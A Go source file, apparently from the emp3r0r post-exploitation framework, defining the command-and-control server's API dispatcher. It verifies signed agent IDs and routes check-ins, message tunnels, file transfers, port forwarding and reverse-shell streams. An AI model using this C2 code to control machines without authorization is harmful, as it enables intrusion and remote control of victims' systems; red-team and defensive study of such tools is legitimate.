package cc

import (
	"encoding/base64"
	"net/http"

	"github.com/gorilla/mux"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// apiDispatcher routes requests to the correct handler.
func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)
	// Setup H2Conn for reverse shell and proxy.
	var rshellConn, proxyConn emp3r0r_def.H2Conn
	RShellStream.H2x = &rshellConn
	ProxyStream.H2x = &proxyConn

	if vars["api"] == "" || vars["token"] == "" {
		LogDebug("Invalid request: %v, missing api/token", req)
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}

	agent_uuid := req.Header.Get("AgentUUID")
	agent_sig, err := base64.URLEncoding.DecodeString(req.Header.Get("AgentUUIDSig"))
	if err != nil {
		LogDebug("Failed to decode agent sig: %v", err)
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}
	isValid, err := tun.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
	if err != nil {
		LogDebug("Failed to verify agent uuid: %v", err)
	}
	if !isValid {
		LogDebug("Invalid agent uuid, refusing request")
		wrt.WriteHeader(http.StatusBadRequest)
		return
	}
	LogDebug("Header: %v", req.Header)
	LogDebug("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%x",
		vars["api"], vars["token"], agent_uuid, agent_sig)

	token := vars["token"]
	api := tun.WebRoot + "/" + vars["api"]
	switch api {
	case tun.CheckInAPI:
		handleAgentCheckIn(wrt, req)
	case tun.MsgAPI:
		handleMessageTunnel(wrt, req)
	case tun.FTPAPI:
		for _, sh := range FTPStreams {
			if token == sh.Token {
				handleFTPTransfer(wrt, req)
				return
			}
		}
		wrt.WriteHeader(http.StatusBadRequest)
	case tun.FileAPI:
		// ...existing FileAPI code...
		if !IsAgentExistByTag(token) {
			wrt.WriteHeader(http.StatusBadRequest)
			return
		}
		path := util.FileBaseName(req.URL.Query().Get("file_to_download"))
		LogDebug("FileAPI request for file: %s, URL: %s", path, req.URL)
		local_path := Temp + tun.WWW + "/" + path
		if !util.IsExist(local_path) {
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(wrt, req, local_path)
	case tun.ProxyAPI:
		handlePortForwarding(wrt, req)
	default:
		wrt.WriteHeader(http.StatusBadRequest)
	}
}
